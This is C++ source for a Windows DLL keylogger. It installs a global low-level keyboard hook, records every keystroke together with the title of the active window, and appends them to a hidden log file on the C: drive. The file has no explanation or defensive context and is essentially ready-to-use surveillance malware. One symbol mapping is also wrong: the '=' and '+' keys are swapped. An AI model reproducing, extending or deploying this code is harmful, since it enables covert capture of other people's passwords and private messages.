#include <Windows.h>
#include <fstream>
using namespace std;

HINSTANCE handle;
HHOOK key;
string PrevWnd;

LRESULT CALLBACK KeyBoardHookCallBack(int code, WPARAM wParam, LPARAM lParam);

BOOL WINAPI DllMain(
	_In_ HINSTANCE hinstDLL,
	_In_ DWORD     fdwReason,
	_In_ LPVOID    lpvReserved
)
{
	handle = hinstDLL;
	return TRUE;
}

extern "C" __declspec(dllexport) void SetKeyBoardHook()
{
	key = SetWindowsHookEx(WH_KEYBOARD_LL, KeyBoardHookCallBack, handle, NULL);
}

LRESULT CALLBACK KeyBoardHookCallBack(int code, WPARAM wParam, LPARAM lParam)
{
	if (code >= 0)
	{
		if (wParam == WM_KEYDOWN)
		{
		//	MessageBoxA(NULL, "Hook Working", "KEYBOARD", NULL);
			PKBDLLHOOKSTRUCT KeyStruct = (KBDLLHOOKSTRUCT*)lParam;
			BYTE KeyCode = KeyStruct->vkCode;
			string key;
			string window;
			fstream f;
			f.open("C:\\ender\\log.txt", ios::app, _SH_DENYNO);

			HWND Wnd = GetForegroundWindow();
			char* CurrentWnd = new char[300];

			GetWindowTextA(Wnd, CurrentWnd, 300);
			if (strcmp(CurrentWnd, PrevWnd.c_str()) == 0)
			{
				window.clear();
			}
			else
			{
				window.assign(CurrentWnd);
				f.write("\n\n", 2);
				f.write(window.c_str(), window.length());
				f.write("\n----> ", 7);
			}

			switch(KeyCode)
			{
			case VK_BACK:
				key.assign("{BACKSPACE}");
				break;
			case VK_RETURN:
				key.assign("{ENTER}");
				break;
			case VK_LEFT:
				key.assign("{LEFT ARROW}");
				break;
			case VK_RIGHT:
				key.assign("{RIGHT ARROW}");
				break;
			case VK_UP:
				key.assign("{UP ARROW}");
				break;
			case VK_DOWN:
				key.assign("{DOWN ARROW}");
				break;
			case VK_SPACE:
				key.assign("{SPACE}");
				break;
			default:
				if (KeyCode >= 0x30 && KeyCode <= 0x39)
				{
					if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
						switch (KeyCode)
						{
						case 0x30:
							key.push_back(')');
							break;
						case 0x31:
							key.push_back('!');
							break;
						case 0x32:
							key.push_back('@');
							break;
						case 0x33:
							key.push_back('#');
							break;
						case 0x34:
							key.push_back('$');
							break;
						case 0x35:
							key.push_back('%');
							break;
						case 0x36:
							key.push_back('^');
							break;
						case 0x37:
							key.push_back('&');
							break;
						case 0x38:
							key.push_back('*');
							break;
						case 0x39:
							key.push_back('(');
						}
					}
					else
					{
						key.push_back(KeyCode);
					}
				}
				else if (KeyCode >= 0x41 && KeyCode <= 0x5a)
				{
					if(GetAsyncKeyState(VK_SHIFT) & 0x8000 || GetKeyState(VK_CAPITAL) & 0x0001)
					{
						key.push_back(KeyCode);
					}
					else {
						key.push_back(KeyCode + 32);
					}
				}
				else
				{
					if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
						switch (KeyCode)
						{
						case 0xbb:
							key.push_back('=');
							break;
						case 0xbc:
							key.push_back('<');
							break;
						case 0xbd:
							key.push_back('_');
							break;
						case 0xbe:
							key.push_back('>');
							break;
						}
					}
					else {
						switch (KeyCode)
						{
						case 0xbb:
							key.push_back('+');
							break;
						case 0xbc:
							key.push_back(',');
							break;
						case 0xbd:
							key.push_back('-');
							break;
						case 0xbe:
							key.push_back('.');
							break;
						}
					}
				}
			}
			// write
			f.write(key.c_str(), key.length());
			f.close();
			PrevWnd.assign(CurrentWnd);
			delete[] CurrentWnd;
		}
	}
	return CallNextHookEx(key, code, wParam, lParam);
}

extern "C" __declspec(dllexport) void RemoveKeyBoardHook()
{
	UnhookWindowsHookEx(key);
}


